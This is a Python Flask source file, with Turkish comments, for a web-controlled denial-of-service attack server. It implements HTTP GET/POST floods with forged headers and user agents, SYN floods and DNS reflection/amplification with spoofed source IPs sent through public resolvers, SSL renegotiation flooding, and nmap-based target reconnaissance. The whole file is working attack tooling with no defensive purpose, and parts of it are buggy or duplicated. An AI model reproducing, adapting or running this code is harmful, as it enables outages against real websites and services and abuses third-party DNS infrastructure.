from flask import Flask, request, jsonify
import requests
import random
import string
import threading
import time
import socket
import ssl
from urllib.parse import urlparse
import psutil
import json
import base64
import hashlib
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.all import RandShort
import nmap
import concurrent.futures
import os
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from scapy.all import IP, UDP, DNS, DNSQR, send
import OpenSSL
from user_agents import parse
import geoip2.database
import dns.resolver

app = Flask(__name__)

proxy_config = None
attack_running = False
attack_stats = {
    'total_requests': 0,
    'successful_requests': 0,
    'failed_requests': 0
}

max_cpu_usage = 80
max_memory_usage = 80
current_threads = 0

# DRDoS saldırısı için açık DNS sunucuları listesi (örnek)
open_dns_servers = [
    "8.8.8.8",  # Google DNS
    "1.1.1.1",  # Cloudflare DNS
    "9.9.9.9",  # Quad9 DNS
    # Daha fazla açık DNS sunucusu eklenebilir
]

# Coğrafi konum veritabanını yüklemeyi deneyin
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
GEOIP_DB_PATH = os.path.join(BASE_DIR, 'geoip', 'GeoLite2-City.mmdb')
geo_reader = None
try:
    geo_reader = geoip2.database.Reader(GEOIP_DB_PATH)
    print("GeoIP veritabanı başarıyla yüklendi.")
except FileNotFoundError:
    print("GeoIP veritabanı bulunamadı. GeoIP özellikleri devre dışı bırakıldı.")
except Exception as e:
    print(f"GeoIP veritabanı yüklenirken bir hata oluştu: {str(e)}")

# User-Agent listesi
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    # Daha fazla User-Agent eklenebilir
]

def generate_spoofed_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def generate_smart_user_agent(ip):
    if geo_reader:
        try:
            response = geo_reader.city(ip)
            country = response.country.name
            os = random.choice(['Windows', 'MacOS', 'Linux'])
            browser = random.choice(['Chrome', 'Firefox', 'Safari', 'Edge'])
            version = f"{random.randint(70, 100)}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"
            
            if os == 'Windows':
                platform = f"Windows NT 10.0; Win64; x64"
            elif os == 'MacOS':
                platform = f"Macintosh; Intel Mac OS X 10_{random.randint(10, 15)}_{random.randint(0, 9)}"
            else:
                platform = f"X11; Linux x86_64"
            
            return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version} Safari/537.36 ({country})"
        except:
            pass
    return random.choice(user_agents)

def generate_dynamic_attack_pattern():
    patterns = [
        lambda: time.sleep(random.uniform(0.1, 0.5)),
        lambda: generate_random_headers(),
        lambda: generate_dynamic_payload(),
        lambda: random.choice([True, False])  # GET veya POST seçimi
    ]
    return random.choice(patterns)

def perform_target_analysis(target_url):
    parsed_url = urlparse(target_url)
    target_host = parsed_url.netloc.split(':')[0]  # Port numarasını kaldır
    
    analysis_results = {
        "open_ports": [],
        "services": {},
        "os_detection": None,
        "vulnerabilities": []
    }
    
    try:
        # Port taraması
        nm = nmap.PortScanner()
        nm.scan(target_host, arguments="-sS -sV -O -p-")
        
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for port in lport:
                    analysis_results["open_ports"].append(port)
                    service_info = nm[host][proto][port]
                    analysis_results["services"][port] = {
                        "name": service_info.get("name", "Unknown"),
                        "product": service_info.get("product", "Unknown"),
                        "version": service_info.get("version", "Unknown")
                    }
        
        # İşletim sistemi tespiti
        if "osmatch" in nm[host]:
            os_matches = nm[host]["osmatch"]
            if os_matches:
                analysis_results["os_detection"] = os_matches[0]["name"]
        
        # Basit zafiyet taraması
        def check_vulnerability(port, service):
            known_vulnerabilities = {
                80: ["Apache Struts", "Heartbleed"],
                443: ["OpenSSL vulnerabilities", "POODLE"],
                22: ["OpenSSH vulnerabilities"],
                21: ["FTP anonymous login"],
                3306: ["MySQL weak passwords"],
            }
            
            if port in known_vulnerabilities:
                return known_vulnerabilities[port]
            return []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_port = {executor.submit(check_vulnerability, int(port), service): port for port, service in analysis_results["services"].items()}
            for future in concurrent.futures.as_completed(future_to_port):
                port = future_to_port[future]
                vulnerabilities = future.result()
                if vulnerabilities:
                    analysis_results["vulnerabilities"].extend(vulnerabilities)
    
    except Exception as e:
        print(f"Hedef analizi hatası: {str(e)}")
        analysis_results["error"] = str(e)
    
    return analysis_results

def generate_dynamic_payload():
    payload = {
        "timestamp": int(time.time()),
        "nonce": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "data": base64.b64encode(os.urandom(random.randint(20, 50))).decode('utf-8')
    }
    return json.dumps(payload)

def generate_random_headers():
    ip = generate_spoofed_ip()
    user_agent = generate_smart_user_agent(ip)
    headers = {
        "User-Agent": user_agent,
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "X-Requested-With": "XMLHttpRequest",
        "X-Forwarded-For": ip,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1"
    }
    headers["X-Custom-Header"] = hashlib.sha256(str(time.time()).encode()).hexdigest()
    return headers

def adjust_attack_intensity(num_threads):
    global current_threads
    cpu_usage = psutil.cpu_percent()
    memory_usage = psutil.virtual_memory().percent
    network_usage = psutil.net_io_counters().bytes_sent / 1024 / 1024  # MB cinsinden

    # CPU, bellek ve ağ kullanımına göre thread sayısını ayarla
    if cpu_usage > max_cpu_usage or memory_usage > max_memory_usage or network_usage > 100:  # 100 MB/s üzerinde ağ kullanımı
        current_threads = max(1, current_threads - 2)
    elif cpu_usage < max_cpu_usage - 20 and memory_usage < max_memory_usage - 20 and network_usage < 50:
        current_threads = min(num_threads, current_threads + 1)
    
    # Saldırı yoğunluğunu dinamik olarak ayarla
    if attack_stats['failed_requests'] > attack_stats['successful_requests'] * 0.1:  # %10'dan fazla başarısız istek varsa
        current_threads = max(1, current_threads - 1)
    
    return current_threads

def create_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def perform_http_flood(target_url, duration, num_threads):
    global attack_running, attack_stats, current_threads
    attack_running = True
    end_time = time.time() + duration
    current_threads = num_threads

    def attack_thread():
        session = create_session()
        while time.time() < end_time and attack_running:
            try:
                ip = generate_spoofed_ip()
                headers = generate_random_headers()
                headers['User-Agent'] = generate_smart_user_agent(ip)
                payload = generate_dynamic_payload()
                
                proxies = {
                    "http": f"http://{proxy_config['username']}:{proxy_config['password']}@{proxy_config['host']}",
                    "https": f"http://{proxy_config['username']}:{proxy_config['password']}@{proxy_config['host']}"
                } if proxy_config and proxy_config.get('use_proxy', True) else None
                
                session.verify = False
                requests.packages.urllib3.disable_warnings()
                
                attack_pattern = generate_dynamic_attack_pattern()
                attack_pattern()
                
                if random.choice([True, False]):
                    response = session.get(
                        target_url,
                        headers=headers,
                        proxies=proxies,
                        timeout=10
                    )
                else:
                    response = session.post(
                        target_url,
                        headers=headers,
                        data=payload,
                        proxies=proxies,
                        timeout=10
                    )
                
                attack_stats['total_requests'] += 1
                if response.status_code == 200:
                    attack_stats['successful_requests'] += 1
                else:
                    attack_stats['failed_requests'] += 1
                print(f"HTTP Flood başarılı: {response.status_code}")
            except requests.exceptions.RequestException as e:
                attack_stats['total_requests'] += 1
                attack_stats['failed_requests'] += 1
                print(f"HTTP Flood hatası: {str(e)}")
            except Exception as e:
                print(f"Beklenmeyen hata: {str(e)}")

    threads = []
    while time.time() < end_time and attack_running:
        current_threads = adjust_attack_intensity(num_threads)
        while len(threads) < current_threads:
            thread = threading.Thread(target=attack_thread)
            thread.start()
            threads.append(thread)
        
        while len(threads) > current_threads:
            thread = threads.pop()
            thread.join(timeout=1)
        
        time.sleep(1)

    attack_running = False
    for thread in threads:
        thread.join()

def perform_syn_flood(target_url, duration, num_threads):
    global attack_running, attack_stats, current_threads
    attack_running = True
    end_time = time.time() + duration
    current_threads = num_threads
    
    parsed_url = urlparse(target_url)
    target_ip = socket.gethostbyname(parsed_url.netloc)
    target_port = parsed_url.port or 80

    def attack_thread():
        while time.time() < end_time and attack_running:
            try:
                ip = IP(src=generate_spoofed_ip(), dst=target_ip)
                tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
                raw = scapy.Raw(b"X"*1024)
                p = ip / tcp / raw
                scapy.send(p, verbose=0)
                
                attack_stats['total_requests'] += 1
                attack_stats['successful_requests'] += 1
                print(f"SYN Flood gönderildi: {target_ip}:{target_port}")
            except Exception as e:
                attack_stats['failed_requests'] += 1
                print(f"SYN Flood hatası: {str(e)}")

    threads = []
    while time.time() < end_time and attack_running:
        current_threads = adjust_attack_intensity(num_threads)
        while len(threads) < current_threads:
            thread = threading.Thread(target=attack_thread)
            thread.start()
            threads.append(thread)
        
        while len(threads) > current_threads:
            thread = threads.pop()
            thread.join(timeout=1)
        
        time.sleep(1)

    attack_running = False
    for thread in threads:
        thread.join()

def perform_drdos_attack(target_url, duration, num_threads):
    global attack_running, attack_stats, current_threads
    attack_running = True
    end_time = time.time() + duration
    current_threads = num_threads

    parsed_url = urlparse(target_url)
    target_ip = socket.gethostbyname(parsed_url.netloc)

    def attack_thread():
        while time.time() < end_time and attack_running:
            try:
                dns_server = random.choice(open_dns_servers)
                domain = f"{random.randbytes(8).hex()}.com"
                
                # DNS sorgusu oluştur
                dns_request = IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                
                # Hedef IP'yi kaynak IP olarak ayarla (IP spoofing)
                dns_request[IP].src = target_ip
                
                # Paketi gönder
                send(dns_request, verbose=0)
                
                attack_stats['total_requests'] += 1
                attack_stats['successful_requests'] += 1
                print(f"DRDoS paketi gönderildi: {dns_server} üzerinden {target_ip}'ye")
            except Exception as e:
                attack_stats['failed_requests'] += 1
                print(f"DRDoS hatası: {str(e)}")

    threads = []
    while time.time() < end_time and attack_running:
        current_threads = adjust_attack_intensity(num_threads)
        while len(threads) < current_threads:
            thread = threading.Thread(target=attack_thread)
            thread.start()
            threads.append(thread)
        
        while len(threads) > current_threads:
            thread = threads.pop()
            thread.join(timeout=1)
        
        time.sleep(1)

    attack_running = False
    for thread in threads:
        thread.join()

def perform_ssl_renegotiation_attack(target_url, duration, num_threads):
    global attack_running, attack_stats, current_threads
    attack_running = True
    end_time = time.time() + duration
    current_threads = num_threads

    parsed_url = urlparse(target_url)
    target_host = parsed_url.netloc
    target_port = parsed_url.port or 443

    def attack_thread():
        while time.time() < end_time and attack_running:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                with socket.create_connection((target_host, target_port)) as sock:
                    with context.wrap_socket(sock, server_hostname=target_host) as secure_sock:
                        for _ in range(10):  # Her bağlantıda 10 yeniden anlaşma dene
                            secure_sock.sendall(b"HEAD / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
                            secure_sock.do_handshake()
                            
                            attack_stats['total_requests'] += 1
                            attack_stats['successful_requests'] += 1
                            print(f"SSL Renegotiation başarılı: {target_host}")
            except Exception as e:
                attack_stats['failed_requests'] += 1
                print(f"SSL Renegotiation hatası: {str(e)}")

    threads = []
    while time.time() < end_time and attack_running:
        current_threads = adjust_attack_intensity(num_threads)
        while len(threads) < current_threads:
            thread = threading.Thread(target=attack_thread)
            thread.start()
            threads.append(thread)
        
        while len(threads) > current_threads:
            thread = threads.pop()
            thread.join(timeout=1)
        
        time.sleep(1)

    attack_running = False
    for thread in threads:
        thread.join()

def perform_dns_amplification(target_url, duration, num_threads):
    global attack_running, attack_stats, current_threads
    attack_running = True
    end_time = time.time() + duration
    current_threads = num_threads

    parsed_url = urlparse(target_url)
    target_ip = socket.gethostbyname(parsed_url.netloc)

    def attack_thread():
        while time.time() < end_time and attack_running:
            try:
                dns_server = random.choice(open_dns_servers)
                domain = f"{random.randbytes(8).hex()}.com"
                
                # DNS sorgusu oluştur
                dns_request = IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                
                # Hedef IP'yi kaynak IP olarak ayarla (IP spoofing)
                dns_request[IP].src = target_ip
                
                # Paketi gönder
                send(dns_request, verbose=0)
                
                attack_stats['total_requests'] += 1
                attack_stats['successful_requests'] += 1
                print(f"DNS Amplification paketi gönderildi: {dns_server} üzerinden {target_ip}'ye")
            except Exception as e:
                attack_stats['failed_requests'] += 1
                print(f"DNS Amplification hatası: {str(e)}")

    threads = []
    while time.time() < end_time and attack_running:
        current_threads = adjust_attack_intensity(num_threads)
        while len(threads) < current_threads:
            thread = threading.Thread(target=attack_thread)
            thread.start()
            threads.append(thread)
        
        while len(threads) > current_threads:
            thread = threads.pop()
            thread.join(timeout=1)
        
        time.sleep(1)

    attack_running = False
    for thread in threads:
        thread.join()

def perform_http_post_flood(target_url, duration, num_threads):
    global attack_running, attack_stats, current_threads
    attack_running = True
    end_time = time.time() + duration
    current_threads = num_threads

    def attack_thread():
        session = create_session()
        while time.time() < end_time and attack_running:
            try:
                ip = generate_spoofed_ip()
                headers = generate_random_headers()
                headers['User-Agent'] = generate_smart_user_agent(ip)
                payload = generate_dynamic_payload()
                
                proxies = {
                    "http": f"http://{proxy_config['username']}:{proxy_config['password']}@{proxy_config['host']}",
                    "https": f"http://{proxy_config['username']}:{proxy_config['password']}@{proxy_config['host']}"
                } if proxy_config and proxy_config.get('use_proxy', True) else None
                
                session.verify = False
                requests.packages.urllib3.disable_warnings()
                
                attack_pattern = generate_dynamic_attack_pattern()
                attack_pattern()
                
                response = session.post(
                    target_url,
                    headers=headers,
                    data=payload,
                    proxies=proxies,
                    timeout=10
                )
                
                attack_stats['total_requests'] += 1
                if response.status_code == 200:
                    attack_stats['successful_requests'] += 1
                else:
                    attack_stats['failed_requests'] += 1
                print(f"HTTP POST Flood başarılı: {response.status_code}")
            except requests.exceptions.RequestException as e:
                attack_stats['total_requests'] += 1
                attack_stats['failed_requests'] += 1
                print(f"HTTP POST Flood hatası: {str(e)}")
            except Exception as e:
                print(f"Beklenmeyen hata: {str(e)}")

    threads = []
    while time.time() < end_time and attack_running:
        current_threads = adjust_attack_intensity(num_threads)
        while len(threads) < current_threads:
            thread = threading.Thread(target=attack_thread)
            thread.start()
            threads.append(thread)
        
        while len(threads) > current_threads:
            thread = threads.pop()
            thread.join(timeout=1)
        
        time.sleep(1)

    attack_running = False
    for thread in threads:
        thread.join()

@app.route('/start_attack', methods=['POST'])
def start_attack():
    global attack_running, attack_stats
    if attack_running:
        return jsonify({"error": "Saldırı zaten başlatıldı"}), 400
    
    data = request.get_json()
    target_url = data.get('target_url')
    attack_type = data.get('attack_type')
    duration = int(data.get('duration', 60))
    num_threads = int(data.get('num_threads', 10))
    use_proxy = data.get('use_proxy', True)
    
    if not target_url or not attack_type:
        return jsonify({"error": "Hedef URL ve saldırı türü gereklidir"}), 400
    
    attack_stats = {
        'total_requests': 0,
        'successful_requests': 0,
        'failed_requests': 0
    }
    
    if use_proxy:
        proxy_config = {
            'host': data.get('proxy_host'),
            'username': data.get('proxy_username'),
            'password': data.get('proxy_password')
        }
    else:
        proxy_config = None
    
    if attack_type == 'http_flood':
        perform_http_flood(target_url, duration, num_threads)
    elif attack_type == 'syn_flood':
        perform_syn_flood(target_url, duration, num_threads)
    elif attack_type == 'drdos':
        perform_drdos_attack(target_url, duration, num_threads)
    elif attack_type == 'ssl_renegotiation':
        perform_ssl_renegotiation_attack(target_url, duration, num_threads)
    elif attack_type == 'dns_amplification':
        perform_dns_amplification(target_url, duration, num_threads)
    elif attack_type == 'http_post_flood':
        perform_http_post_flood(target_url, duration, num_threads)
    else:
        return jsonify({"error": "Geçersiz saldırı türü"}), 400
    
    return jsonify(attack_stats)

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_running
    attack_running = False
    return jsonify({"message": "Saldırı durduruldu"})

@app.route('/attack_stats', methods=['GET'])
def get_attack_stats():
    return jsonify(attack_stats)

@app.route('/analyze_target', methods=['POST'])
def analyze_target():
    data = request.get_json()
    target_url = data.get('target_url')
    if not target_url:
        return jsonify({"error": "Hedef URL gereklidir"}), 400
    
    try:
        analysis_results = perform_target_analysis(target_url)
        return jsonify(analysis_results)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)